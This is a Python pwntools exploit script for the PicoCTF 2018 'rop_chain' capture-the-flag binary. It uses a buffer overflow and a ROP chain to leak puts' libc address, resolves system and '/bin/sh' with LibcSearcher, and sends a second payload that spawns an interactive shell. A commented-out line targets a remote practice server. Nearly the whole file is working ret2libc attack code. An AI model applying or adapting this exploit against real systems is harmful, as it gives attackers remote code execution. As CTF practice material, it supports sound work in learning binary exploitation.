from LibcSearcher import LibcSearcher
from pwn import *


def PicoCTF_2018_rop_chain(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/PicoCTF_2018_rop_chain'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    # target = remote('node5.buuoj.cn', 27857)
    target_elf = ELF(file_name)

    puts_plt = p32(target_elf.plt['puts'])
    puts_got = p32(target_elf.got['puts'])
    vuln_addr = p32(target_elf.symbols['vuln'])

    pop_ret_gadget = p32(0x0804840d)  # pop ebx ; ret

    payload_1 = b'A' * (0x18 + 0x4)
    # printf(printf_got)
    payload_1 += puts_plt + pop_ret_gadget + puts_got
    # vuln()
    payload_1 += vuln_addr

    target.sendlineafter(b'Enter your input> ', payload_1)

    puts_addr = u32(target.recv(4))
    print(hex(puts_addr))

    searcher = LibcSearcher('puts', puts_addr)
    libc_base_addr = puts_addr - searcher.dump('puts')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (0x18 + 0x4)
    # system(/bin/sh)
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr

    # gdb.attach(target)
    target.sendline(payload_2)

    target.interactive()


if __name__ == '__main__':
    PicoCTF_2018_rop_chain()
